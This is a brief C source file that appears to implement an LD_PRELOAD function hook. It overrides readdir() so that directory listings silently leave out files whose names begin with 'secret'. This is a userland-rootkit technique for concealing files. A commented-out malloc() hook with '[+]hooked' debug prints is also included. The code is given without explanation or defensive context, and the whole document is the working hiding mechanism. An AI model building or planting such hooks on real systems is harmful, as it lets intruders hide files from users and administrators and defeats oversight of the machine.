#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdlib.h>
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#define FileToHide "secret"
struct dirent* (*org_readdir)(DIR *) = NULL;
struct dirent*readdir(DIR *drip)
{
    if(org_readdir == NULL)
        org_readdir = (struct dirent*(*)(DIR *))dlsym(RTLD_NEXT, "readdir");
    struct dirent *ep = org_readdir(drip);
    while (ep!= NULL && !strncmp(ep->d_name, FileToHide, strlen(FileToHide)))
        ep = org_readdir(drip);
    return ep;
}
/*
static void *(*org_malloc)(size_t) = NULL;
void *malloc(size_t size)
{
    fprintf(stderr, "\t[+]hooked function called![+]\t");
    if(org_malloc == NULL)
    {
        org_malloc = (void *(*)(size_t))dlsym(RTLD_NEXT, "malloc");
        fprintf(stderr, "\t[+]found the next malloc[+]\t");
    }
        fprintf(stderr, "\t[+]call old malloc [+]\t");
    void *alloc_addr = NULL;
    alloc_addr =  org_malloc(size);
    return alloc_addr;
}*/